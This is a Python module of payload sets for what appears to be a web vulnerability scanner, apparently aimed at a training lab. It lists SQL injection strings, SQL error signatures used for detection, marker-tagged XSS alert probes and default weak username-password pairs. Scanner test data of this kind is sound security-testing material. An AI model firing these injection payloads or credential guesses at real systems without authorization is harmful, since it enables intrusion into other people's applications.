"""Payload sets and error signatures used by the vulnerability checks."""

SQLI_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' -- -",
    "\" OR \"1\"=\"1",
    "' OR 1=1#",
    "1' ORDER BY 1--+",
    "' UNION SELECT NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
]

SQLI_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "pg_query()",
    "sqlite3.operationalerror",
    "ora-00933",
    "microsoft odbc",
    "syntax error at or near",
    "mysql_fetch",
    "native client",
    # SQLite-specific error phrasing (low false-positive, DB-distinctive).
    "unrecognized token",
    "incomplete input",
    "sqlitedatabaseerror",
]

XSS_PAYLOADS = [
    "<script>alert('xvwa_xss_1')</script>",
    "\"><script>alert('xvwa_xss_2')</script>",
    "'><img src=x onerror=alert('xvwa_xss_3')>",
    "<img src=x onerror=alert('xvwa_xss_4')>",
    "<svg/onload=alert('xvwa_xss_5')>",
]

WEAK_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("administrator", "administrator"),
    ("root", "root"),
    ("root", "toor"),
    ("test", "test"),
    ("user", "user"),
    ("admin", "123456"),
    ("guest", "guest"),
]
